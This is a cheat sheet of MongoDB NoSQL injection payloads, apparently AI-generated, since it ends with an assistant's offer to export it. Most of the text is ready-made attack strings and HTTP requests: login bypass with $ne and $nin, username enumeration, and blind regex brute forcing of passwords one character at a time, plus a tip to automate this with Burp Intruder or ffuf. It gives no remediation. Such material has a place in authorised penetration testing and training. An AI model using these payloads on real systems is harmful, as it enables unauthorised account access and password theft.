# NoSQL Injection Cheat Sheet (MongoDB)

## Context

Most NoSQL injections exploit MongoDB-style query syntax through insecure form fields (typically login, search, filter). Since MongoDB uses JSON-like queries, attackers can tamper with parameters in GET or POST requests by injecting special query operators.

---

### 1. **\[\$ne] – Not Equal**

**Usage:** Bypass authentication by making the value not equal to the real one.

**Context:** If the backend uses something like:

```js
db.users.find({ "username": inputUser, "password": inputPass })
```

**Payload:**

```nosql
username[$ne]=admin&password[$ne]=anything
```

**Effect:** Matches all users where username ≠ admin and password ≠ anything — likely returns a valid user if no validation is done properly.

---

### 2. **\[\$eq] – Equal**

**Usage:** Used explicitly to match exact values. Not typically useful for bypassing, but can be combined with regex or for enumeration.

**Payload:**

```nosql
username[$eq]=admin&password[$eq]=admin123
```

---

### 3. **\[\$gt], \[\$lt] – Greater Than / Less Than**

**Usage:** Bypass or enumerate values based on numeric comparisons.

**Payload:**

```nosql
age[$gt]=0&age[$lt]=100
```

---

### 4. **\[\$in] – Value is in Array**

**Usage:** Check if a value matches any in a set.

**Payload:**

```nosql
username[$in][]=admin&username[$in][]=root
```

---

### 5. **\[\$nin] – Value is *not* in Array**

**Usage:** Bypass filtering by excluding values from a set.

**Payload:**

```nosql
username[$nin][]=admin&username[$nin][]=john&password[$ne]=xyz
```

**Effect:** Fetches users who are not 'admin' or 'john', and whose password ≠ xyz.

---

### 6. **\[\$regex] – Regular Expression Matching**

**Usage:** Bruteforce/Enumerate string patterns, especially for passwords.

---

#### a. **Match known pattern:**

```nosql
username=admin&password[$regex]=^admin123$
```

**Meaning:** Password must be exactly "admin123".

---

#### b. **Enumerate length:**

**Payload:**

```nosql
username=admin&password[$regex]=^.{8}$
```

**Meaning:** Match any password of length 8.

---

#### c. **Character-by-character guessing (blind):**

For password length 6, testing if first letter is `a`:

```nosql
username=admin&password[$regex]=^a.....
```

Testing if first letter is `b`:

```nosql
username=admin&password[$regex]=^b.....
```

Keep iterating to bruteforce.

---

#### d. **Find exact match using regex:**

```nosql
password[$regex]=^password123$
```

---

### 7. **\[\$exists] – Field existence check**

**Payload:**

```nosql
username[$exists]=true
```

**Context:** Can be used to test which fields exist and cause logic flaws.

---

### 8. **\[\$where] – JavaScript expression (advanced/rare)**

**Payload (dangerous):**

```nosql
username[$where]=this.password.length==8
```

**Note:** Only works if backend supports `$where` (can be disabled due to security).

---

## Full Payload Examples

### Authentication Bypass (classic)

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=admin&password[$ne]=dummy
```

---

### Filter bypass using \$nin

```http
username[$nin][]=admin&username[$nin][]=root&password[$ne]=123
```

---

### Password length guessing

```http
username=admin&password[$regex]=^.{8}$
```

---

### Blind character guessing

```http
username=admin&password[$regex]=^a.....
```

→ Next:

```http
username=admin&password[$regex]=^b.....
```

---

### Username enumeration

```http
username[$regex]=^a.*&password[$ne]=xyz
```

---

## NoSQL Regex Note: `{X}` vs `{X}$`

### `^.{X}`

* Matches strings with **at least X characters**
* Useful for testing **minimum length**
* Can give **false positives** if the string is longer than X

**Example:**

```nosql
password[$regex]=^.{6}
```

Matches: `"secret"`, `"secret123"`
Does not match: `"short"`

---

### `^.{X}$`

* Matches strings with **exactly X characters**
* Best for testing **exact password length**

**Example:**

```nosql
password[$regex]=^.{6}$
```

Matches: `"secret"`
Does not match: `"secret1"`, `"short"`

---

### Tip

Use `$` when:

* You want to confirm the **exact length** of a value
* You're brute-forcing a password **character-by-character**

---

Let me know if you want this exported as Markdown or added to your full NoSQLi guide.

---

**Tip**: Use tools like **Burp Suite Intruder**, **ffuf**, or **custom scripts** to automate character guessing and regex payload testing

---
